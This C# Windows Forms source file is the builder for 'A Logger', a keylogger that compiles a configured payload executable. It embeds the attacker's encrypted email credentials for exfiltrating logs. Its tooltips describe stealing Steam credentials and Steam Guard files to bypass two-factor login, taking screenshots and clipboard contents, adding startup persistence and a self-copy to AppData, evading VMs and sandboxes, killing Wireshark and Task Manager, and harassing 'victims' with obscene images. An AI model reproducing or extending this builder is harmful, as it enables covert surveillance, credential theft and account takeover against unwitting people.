using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.VisualBasic;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Text.RegularExpressions;
using System.Threading;
using System.Resources;

namespace Fun_Logger
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        string rawsource = Properties.Resources.sauce;
        string version = "1.5";
        emailForm eForm = new emailForm();
        cryptForm cForm = new cryptForm();
        string wpURL;
        private void Form1_Load(object sender, EventArgs e)
        {
            //MessageBox.Show("Checking for update");
            //CheckUpdate();
            this.Location = new Point(((Screen.PrimaryScreen.WorkingArea.Width - this.Width) / 2) - 169, (Screen.PrimaryScreen.WorkingArea.Height - this.Height) / 2);
            checkBox1.MouseHover += checkBox1_MouseHover;
            checkBox2.MouseHover += checkBox2_MouseHover;
            checkBox3.MouseHover += checkBox3_MouseHover;
            checkBox4.MouseHover += checkBox4_MouseHover;
            checkBox5.MouseHover += checkBox5_MouseHover;
            checkBox6.MouseHover += checkBox6_MouseHover;
            checkBox7.MouseHover += checkBox7_MouseHover;
            checkBox8.MouseHover += checkBox8_MouseHover;
            checkBox9.MouseHover += checkBox9_MouseHover;
            checkBox10.MouseHover += checkBox10_MouseHover;
            checkBox11.MouseHover += checkBox11_MouseHover;
            checkBox12.MouseHover += checkBox12_MouseHover;
            checkBox13.MouseHover += checkBox13_MouseHover;
            checkBox14.MouseHover += checkBox14_MouseHover;
            checkBox15.MouseHover += checkBox15_MouseHover;
        }

        void checkBox15_MouseHover(object sender, EventArgs e)
        {
            var toolTip1 = new System.Windows.Forms.ToolTip();
            toolTip1.AutoPopDelay = 5000;
            toolTip1.InitialDelay = 100;
            toolTip1.ReshowDelay = 500;
            toolTip1.ShowAlways = true;
            toolTip1.IsBalloon = true;
            toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            toolTip1.ToolTipTitle = "CD Open-Tray";
            toolTip1.SetToolTip(checkBox15, "Opens the CD tray and shows a message saying \"I'm hungry.\" Will keep reopening the tray every time the victim closes it");
        }

        void checkBox14_MouseHover(object sender, EventArgs e)
        {
            var toolTip1 = new System.Windows.Forms.ToolTip();
            toolTip1.AutoPopDelay = 5000;
            toolTip1.InitialDelay = 100;
            toolTip1.ReshowDelay = 500;
            toolTip1.ShowAlways = true;
            toolTip1.IsBalloon = true;
            toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            toolTip1.ToolTipTitle = "Change Wallpaper";
            toolTip1.SetToolTip(checkBox14, "Will change victim's wallpaper to an image specified by URL and change it back if the victim changes it again");
        }

        void checkBox13_MouseHover(object sender, EventArgs e)
        {
            var toolTip1 = new System.Windows.Forms.ToolTip();
            toolTip1.AutoPopDelay = 5000;
            toolTip1.InitialDelay = 100;
            toolTip1.ReshowDelay = 500;
            toolTip1.ShowAlways = true;
            toolTip1.IsBalloon = true;
            toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            toolTip1.ToolTipTitle = "IE Default";
            toolTip1.SetToolTip(checkBox13, "Will constantly set Internet Explorer as the victim's default browser, and whenever the victim opens up Chrome or Firefox, it kills the process and opens IE again");
        }

        void checkBox12_MouseHover(object sender, EventArgs e)
        {
            var toolTip1 = new System.Windows.Forms.ToolTip();
            toolTip1.AutoPopDelay = 5000;
            toolTip1.InitialDelay = 100;
            toolTip1.ReshowDelay = 500;
            toolTip1.ShowAlways = true;
            toolTip1.IsBalloon = true;
            toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            toolTip1.ToolTipTitle = "Activation Alert";
            toolTip1.SetToolTip(checkBox12, "Will send you an email notice every time the keylogger activates");
        }

        void checkBox11_MouseHover(object sender, EventArgs e)
        {
            var toolTip1 = new System.Windows.Forms.ToolTip();
            toolTip1.AutoPopDelay = 5000;
            toolTip1.InitialDelay = 100;
            toolTip1.ReshowDelay = 500;
            toolTip1.ShowAlways = true;
            toolTip1.IsBalloon = true;
            toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            toolTip1.ToolTipTitle = "Steal Steam Credentials";
            toolTip1.SetToolTip(checkBox11, "Will force Steam to relogin the next time the user runs it, and will send Steam Guard and config.vdf files in attachments, \nthus allowing you to login to a Steam account bypassing Steam Guard. When the victim logs into Steam, you will get a STEAM LOGS \nemail from A Logger with the keylogged username and password and 3 attached files. There is a screenshot and 2 necessary files. Go into the Steam folder \nin Program Files and replace your current ssfn file with the attached one. Then go into the config folder and replace the config.vdf file with the attached one.\n This will fool Steam into thinking it's on the same computer as the victim.");
        }

        void CheckUpdate()
        {
            string page;
            string URL;
            int times = 17;
            WebClient wc = new WebClient();
            page = wc.DownloadString("http://www.aloggerhf.blogspot.com");
            Regex r = new Regex(@"(?<Protocol>\w+):\/\/(?<Domain>[\w@][\w.:@]+)\/?[\w\.?=%&=\-@/$,]*");
            Match m = r.Match(page);
            while (m.Success) 
                {
                    times--;
                    if (times == 0)
                    {
                        URL = m.Value;
                        if (!URL.Contains(version))
                        {
                            MessageBox.Show("There is an update to A Logger. Opening download page.");
                            Process.Start(URL);
                            Environment.Exit(0);
                        }
                        else
                        {
                            MessageBox.Show("You have the newest version of A Logger");
                        }
                    }
                    m = m.NextMatch();
                }
        }

        void checkBox10_MouseHover(object sender, EventArgs e)
        {
            var toolTip1 = new System.Windows.Forms.ToolTip();
            toolTip1.AutoPopDelay = 5000;
            toolTip1.InitialDelay = 100;
            toolTip1.ReshowDelay = 500;
            toolTip1.ShowAlways = true;
            toolTip1.IsBalloon = true;
            toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            toolTip1.ToolTipTitle = "Meat Spin";
            toolTip1.SetToolTip(checkBox10, "Will attempt to crash the computer by opening up multiple windows to meatspin.com");
            
        }

        void checkBox9_MouseHover(object sender, EventArgs e)
        {
            var toolTip1 = new System.Windows.Forms.ToolTip();
            toolTip1.AutoPopDelay = 5000;
            toolTip1.InitialDelay = 100;
            toolTip1.ReshowDelay = 500;
            toolTip1.ShowAlways = true;
            toolTip1.IsBalloon = true;
            toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            toolTip1.ToolTipTitle = "Peen Flash";
            toolTip1.SetToolTip(checkBox9, "Will quickly flash a picture of a penis on the screen every 2-5 minutes");
        }

        void checkBox8_MouseHover(object sender, EventArgs e)
        {
            var toolTip1 = new System.Windows.Forms.ToolTip();
            toolTip1.AutoPopDelay = 5000;
            toolTip1.InitialDelay = 100;
            toolTip1.ReshowDelay = 500;
            toolTip1.ShowAlways = true;
            toolTip1.IsBalloon = true;
            toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            toolTip1.ToolTipTitle = "Clipboard Copy";
            toolTip1.SetToolTip(checkBox8, "Copies any text on the clipboard and reveals it in each log");
            
        }

        void checkBox7_MouseHover(object sender, EventArgs e)
        {
            var toolTip1 = new System.Windows.Forms.ToolTip();
            toolTip1.AutoPopDelay = 5000;
            toolTip1.InitialDelay = 100;
            toolTip1.ReshowDelay = 500;
            toolTip1.ShowAlways = true;
            toolTip1.IsBalloon = true;
            toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            toolTip1.ToolTipTitle = "Clipboard Replace";
            toolTip1.SetToolTip(checkBox7, "Randomly replaces what's on the clipboard with one of 30 depictions of penises");
            
        }

        void checkBox6_MouseHover(object sender, EventArgs e)
        {
            var toolTip1 = new System.Windows.Forms.ToolTip();
            toolTip1.AutoPopDelay = 5000;
            toolTip1.InitialDelay = 100;
            toolTip1.ReshowDelay = 500;
            toolTip1.ShowAlways = true;
            toolTip1.IsBalloon = true;
            toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            toolTip1.ToolTipTitle = "Delete Cookies";
            toolTip1.SetToolTip(checkBox6, "Delete the cookies of Chrome, Firefox, and Internet Explorer");
        }

        void checkBox5_MouseHover(object sender, EventArgs e)
        {
            var toolTip1 = new System.Windows.Forms.ToolTip();
            toolTip1.AutoPopDelay = 5000;
            toolTip1.InitialDelay = 100;
            toolTip1.ReshowDelay = 500;
            toolTip1.ShowAlways = true;
            toolTip1.IsBalloon = true;
            toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            toolTip1.ToolTipTitle = "Message Box";
            toolTip1.SetToolTip(checkBox5, "The program will show a message box with any message");
        }

        void checkBox4_MouseHover(object sender, EventArgs e)
        {
                var toolTip1 = new System.Windows.Forms.ToolTip();
                toolTip1.AutoPopDelay = 5000;
                toolTip1.InitialDelay = 100;
                toolTip1.ReshowDelay = 500;
                toolTip1.ShowAlways = true;
                toolTip1.IsBalloon = true;
                toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
                toolTip1.ToolTipTitle = "Melt";
                toolTip1.SetToolTip(checkBox4, "Upon execute, will make a copy of itself in a in the Appdata folder and re-execute from there if it isn't already there");
        }

        void checkBox3_MouseHover(object sender, EventArgs e)
        {
                var toolTip1 = new System.Windows.Forms.ToolTip();
                toolTip1.AutoPopDelay = 5000;
                toolTip1.InitialDelay = 100;
                toolTip1.ReshowDelay = 500;
                toolTip1.ShowAlways = true;
                toolTip1.IsBalloon = true;
                toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
                toolTip1.ToolTipTitle = "Antis";
                toolTip1.SetToolTip(checkBox3, "Kills self if executed in environments including Sandboxie, a VM, or Anubis. Also kills Wireshark, Fiddler, and Task Manager.");
        }

        void checkBox2_MouseHover(object sender, EventArgs e)
        {
                var toolTip1 = new System.Windows.Forms.ToolTip();
                toolTip1.AutoPopDelay = 5000;
                toolTip1.InitialDelay = 100;
                toolTip1.ReshowDelay = 500;
                toolTip1.ShowAlways = true;
                toolTip1.IsBalloon = true;
                toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
                toolTip1.ToolTipTitle = "Screenshots";
                toolTip1.SetToolTip(checkBox2, "Your logs will contain images of the user's screen");
        }

        void checkBox1_MouseHover(object sender, EventArgs e)
        {
                var toolTip1 = new System.Windows.Forms.ToolTip();
                toolTip1.AutoPopDelay = 5000;
                toolTip1.InitialDelay = 100;
                toolTip1.ReshowDelay = 500;
                toolTip1.ShowAlways = true;
                toolTip1.IsBalloon = true;
                toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
                toolTip1.ToolTipTitle = "Startup";
                toolTip1.SetToolTip(checkBox1, "The executable will start each time the computer turns on");
        }


        private void button1_Click(object sender, EventArgs e)
        {
            string password = RandomString(12);
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*";
            sfd.ShowDialog();
            if (sfd.FileName != string.Empty)
            {
                if (checkBox14.Checked)
                {
                    rawsource = rawsource.Replace("//Thread wp = new Thread(WallPaper); wp.Start();", "Thread wp = new Thread(WallPaper); wp.Start();");
                    rawsource = rawsource.Replace("//[WP]", Properties.Resources.wallpaper);
                    rawsource = rawsource.Replace("[WALLPAPER URL]", wpURL);
                }
                rawsource = rawsource.Replace("static int time = 60000;", "static int time = " + Convert.ToString(Convert.ToInt32(textBox3.Text) * 60000) + ";");
                rawsource = rawsource.Replace("[EMAIL]", Encrypt(eForm.textBox1.Text, password));
                rawsource = rawsource.Replace("[PASS]", password);
                rawsource = rawsource.Replace("[PASSWORD]", Encrypt(eForm.textBox2.Text, password));
                rawsource = rawsource.Replace("[EMAIL SERVER]", eForm.textBox3.Text);
                rawsource = rawsource.Replace("[SERVER PORT]", eForm.textBox4.Text);
                checkBoxes();
                Compile(sfd.FileName);
                MessageBox.Show("Successfully compiled to " + sfd.FileName + ". Enjoy!");
            }
        }

        void checkBoxes()
        {
           
        }

        public string RandomString(int size)
        {
            string pool = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            string final = string.Empty;
            for (int i = 0; i < size; i++)
            {
                Random Rand = new Random();
                int penis = Rand.Next(52);
                System.Threading.Thread.Sleep(15);
                final = final + pool[penis];
            }

            return final;
        }

        private string Encrypt(string InputText, string Password)
        {
            RijndaelManaged managed = new RijndaelManaged();
            byte[] buffer = Encoding.Unicode.GetBytes(InputText);
            byte[] rgbSalt = Encoding.ASCII.GetBytes(Password.Length.ToString());
            PasswordDeriveBytes bytes = new PasswordDeriveBytes(Password, rgbSalt);
            ICryptoTransform transform = managed.CreateEncryptor(bytes.GetBytes(0x10), bytes.GetBytes(0x10));
            MemoryStream stream = new MemoryStream();
            CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Write);
            stream2.Write(buffer, 0, buffer.Length);
            stream2.FlushFinalBlock();
            byte[] inArray = stream.ToArray();
            stream.Close();
            stream2.Close();
            return Convert.ToBase64String(inArray);
        }

        void Compile(string filename)
        {
            CodeDom.Compile(filename, rawsource);
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                rawsource = rawsource.Replace("//[Startup]", Properties.Resources.startup);
                rawsource = rawsource.Replace("//AddToStartup();", "AddToStartup();");
            }
            else
            {
                rawsource = rawsource.Replace(Properties.Resources.startup, "//[Startup]");
                rawsource = rawsource.Replace("AddToStartup();", "//AddToStartup();");
            }
        }

        private void checkBox5_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox5.Checked == true)
            {
                string message = Interaction.InputBox("Enter a message:", "Show Message Box", string.Empty);
                if (message == string.Empty)
                {
                    checkBox5.Checked = false;
                    return;
                }
                rawsource = rawsource.Replace("//[Message]", Properties.Resources.message);
                rawsource = rawsource.Replace("//Message();", "Message();");
                rawsource = rawsource.Replace("MSG", message);
            }
            else
            {
                rawsource = rawsource.Replace("Message();", "//Message();");
            }
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
                rawsource = rawsource.Replace("//[Screenshot]", Properties.Resources.screenshot);
                rawsource = rawsource.Replace("//mail.Attachments.Add(a);", "mail.Attachments.Add(a);");
                rawsource = rawsource.Replace("//ms.Close();", "ms.Close();");
            }
            else
            {
                rawsource = rawsource.Replace(Properties.Resources.screenshot, "//[Screenshot]");
                rawsource = rawsource.Replace("mail.Attachments.Add(a);", "//mail.Attachments.Add(a);");
                rawsource = rawsource.Replace("ms.Close();", "//ms.Close();");
            }
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
                rawsource = rawsource.Replace("//[Antis]", Properties.Resources.antis);
                rawsource = rawsource.Replace("//AntiRun();", "AntiRun();");
            }
            else
            {
                rawsource = rawsource.Replace(Properties.Resources.antis, "//[Antis]");
                rawsource = rawsource.Replace("AntiRun();", "//AntiRun();");
            }
        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox4.Checked)
            {
                rawsource = rawsource.Replace("//[Melt]", Properties.Resources.melt);
                rawsource = rawsource.Replace("//Melt();", "Melt();");
            }
            else
            {
                rawsource = rawsource.Replace(Properties.Resources.melt, "//[Melt]");
                rawsource = rawsource.Replace("Melt();", "//Melt();");
            }
        }

        private void checkBox6_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox6.Checked)
            {
                rawsource = rawsource.Replace("//[Cookies]", Properties.Resources.cookies);
                rawsource = rawsource.Replace("//Cookies();", "Cookies();");
            }
            else
            {
                rawsource = rawsource.Replace(Properties.Resources.cookies, "//[Cookies]");
                rawsource = rawsource.Replace("Cookies();", "//Cookies();");
            }
        }

        private void checkBox8_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox8.Checked)
            {
                rawsource = rawsource.Replace("//[ClipboardC]", Properties.Resources.clipboardc);
            }
            else
            {
                rawsource = rawsource.Replace(Properties.Resources.clipboardc, "//[ClipboardC]");
            }
        }

        private void checkBox7_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox7.Checked)
            {
                rawsource = rawsource.Replace("//[Penis]", Properties.Resources.penis);
                rawsource = rawsource.Replace("//Penis();", "Penis();");
            }
            else
            {
                rawsource = rawsource.Replace(Properties.Resources.penis, "//[Penis]");
                rawsource = rawsource.Replace("Penis();", "//Penis();");
            }
        }

        private void checkBox10_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox10.Checked)
            {
                rawsource = rawsource.Replace("//[Meatspin]", Properties.Resources.meatspin);
                rawsource = rawsource.Replace("//Meatspin();", "Meatspin();");
            }
            else
            {
                rawsource = rawsource.Replace(Properties.Resources.meatspin, "//[Meatspin]");
                rawsource = rawsource.Replace("Meatspin();", "//Meatspin();");
            }
        }

        private void checkBox9_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox9.Checked)
            {
                rawsource = rawsource.Replace("//[Flash]", Properties.Resources.flash);
                rawsource = rawsource.Replace("//Thread f = new Thread(Flash); f.Start();", "Thread f = new Thread(Flash); f.Start();");
            }
            else
            {
                rawsource = rawsource.Replace(Properties.Resources.flash, "//[Flash]");
                rawsource = rawsource.Replace("Thread f = new Thread(Flash); f.Start();", "//Thread f = new Thread(Flash); f.Start();");
            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            MessageBox.Show("Leon Li 2013");
        }


        private void checkBox11_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox11.Checked)
            {
                rawsource = rawsource.Replace("//Thread stm = new Thread(Steam); stm.Start();", "Thread stm = new Thread(Steam); stm.Start();");
                rawsource = rawsource.Replace("//[Steam]", Properties.Resources.steam);
            }
            else
            {
                rawsource = rawsource.Replace("Thread stm = new Thread(Steam); stm.Start();", "//Thread stm = new Thread(Steam); stm.Start();");
                rawsource = rawsource.Replace(Properties.Resources.steam, "//[Steam]");
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            eForm.Show();
        }

        private void checkBox12_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox12.Checked)
            {
                rawsource = rawsource.Replace("//Alert();", "Alert();");
                rawsource = rawsource.Replace("//[Alert]", Properties.Resources.alert);
            }
            else
            {
                rawsource = rawsource.Replace("Alert();", "//Alert();");
                rawsource = rawsource.Replace(Properties.Resources.alert, "//[Alert]");
            }
        }

        private void checkBox13_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox13.Checked)
            {
                rawsource = rawsource.Replace("//Thread ie = new Thread(IEDefault); ie.Start();", "Thread ie = new Thread(IEDefault); ie.Start();");
                rawsource = rawsource.Replace("//[IE]", Properties.Resources.ie);
            }
            else
            {
                rawsource = rawsource.Replace("Thread ie = new Thread(IEDefault); ie.Start();", "//Thread ie = new Thread(IEDefault); ie.Start();");
                rawsource = rawsource.Replace(Properties.Resources.ie, "//[IE]");
            }
        }

        private void checkBox14_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox14.Checked)
            {
                wpURL = Interaction.InputBox("Input the URL to the image", "Image URL", "");
            }
        }

        private void checkBox15_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox15.Checked)
            {
                rawsource = rawsource.Replace("//Thread cdThread = new Thread(CD); cdThread.Start();", "Thread cdThread = new Thread(CD); cdThread.Start();");
                rawsource = rawsource.Replace("//[CD]", Properties.Resources.cd);
            }
            else
            {
                rawsource = rawsource.Replace("Thread cdThread = new Thread(CD); cdThread.Start();", "//Thread cdThread = new Thread(CD); cdThread.Start();");
                rawsource = rawsource.Replace(Properties.Resources.cd, "//[CD]");
            }
        }

        private void checkBox17_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox17.Checked) { cForm.Show(); }
            else { cForm.Hide(); }
        }






    }

}
